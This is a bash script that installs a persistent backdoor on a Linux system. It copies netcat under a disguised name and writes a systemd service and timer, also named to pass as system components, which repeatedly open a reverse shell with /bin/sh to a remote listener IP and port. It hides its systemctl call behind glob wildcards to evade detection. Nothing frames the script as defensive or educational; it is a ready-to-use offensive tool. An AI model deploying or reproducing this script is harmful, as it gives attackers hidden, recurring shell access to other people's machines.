#!/bin/bash

if [[ $1 == "" ]]; then
    echo "Description: Installs a local systemd timer service which spawns a netcat reverse shell at a specified timer interval."
    echo "Usage: ./systemd.sh [remote listener ip] [remote listen port] [timer]";
    echo "Example: ./systemd.sh 123.123.123.123 80 10";
    exit 1;
fi

LISTEN_IP=$1
LISTEN_PORT=$2
TIMER=$3
NC=$(which nc)

# service
cp $NC /lib/systemd/systemd-service
echo "[Unit]" > /lib/systemd/system/systemd.service
echo "Description = Systemd Service" >> /lib/systemd/system/systemd.service
echo "[Service]" >> /lib/systemd/system/systemd.service
echo "Type=oneshot" >> /lib/systemd/system/systemd.service
echo "ExecStart = /lib/systemd/systemd-service $LISTEN_IP $LISTEN_PORT -e /bin/sh" >> /lib/systemd/system/systemd.service

# timer
echo "[Unit]" > /lib/systemd/system/systemd.timer
echo "Description=Systemd" >> /lib/systemd/system/systemd.timer
echo "[Timer]" >> /lib/systemd/system/systemd.timer
echo "OnCalendar=*:0/$TIMER" >> /lib/systemd/system/systemd.timer

/b?n/s?st?m??l start systemd.timer
/b?n/s?st?m??l list-timers

# cleanup
#systemctl disable systemd.timer
#systemctl stop systemd.timer
#rm /lib/systemd/systemd-service
#rm /lib/systemd/system/systemd.service
#rm /lib/systemd/system/systemd.timer
